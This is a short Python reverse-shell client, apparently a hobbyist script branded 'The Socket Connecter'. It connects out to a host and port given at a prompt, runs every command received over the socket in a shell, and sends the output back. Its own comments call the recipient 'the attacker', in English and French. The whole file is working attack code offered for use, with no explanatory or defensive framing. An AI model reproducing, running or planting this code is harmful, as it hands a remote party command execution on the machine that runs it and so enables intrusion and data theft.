import socket
import subprocess, os

print("######################")
print("#                    #")
print("#     The Socket     #")
print("#     Connecter      #")
print("#                    #")
print("#     By Yo Boi      #")
print("#       Riley        #")
print("######################")
 
host = input("What host would you like to connect to? ")
port = int(input("What port is the server using? "))
connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connection_socket.connect((host, port))
print("\n[*] Connected to " +host+ " on port " +str(port)+ ".\n")
 
while True:
    
    command = connection_socket.recv(1024)
    split_command = command.split()
    print("Received command : " +command)
 
    # if its quit, then break out and close socket
    if command == "quit":
        break
 
    if(command.split()[0] == "cd"):
            if len(command.split()) == 1:
                connection_socket.send((os.getcwd()))
            elif len(command.split()) == 2:
                try:
                    os.chdir(command.split()[1])
                    connection_socket.send(("Changed directory to " + os.getcwd()))
                except(WindowsError):
                    connection_socket.send(str.encode("No such directory : " +os.getcwd()))
 
    else:
        # do shell command
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        print(stdout_value + "\n")
        # send output to attacker
        if(stdout_value != ""):
            connection_socket.send(stdout_value)  # renvoit l'output  à l'attaquant
        else:
            connection_socket.send(command+ " does not return anything")
 
 
connection_socket.close()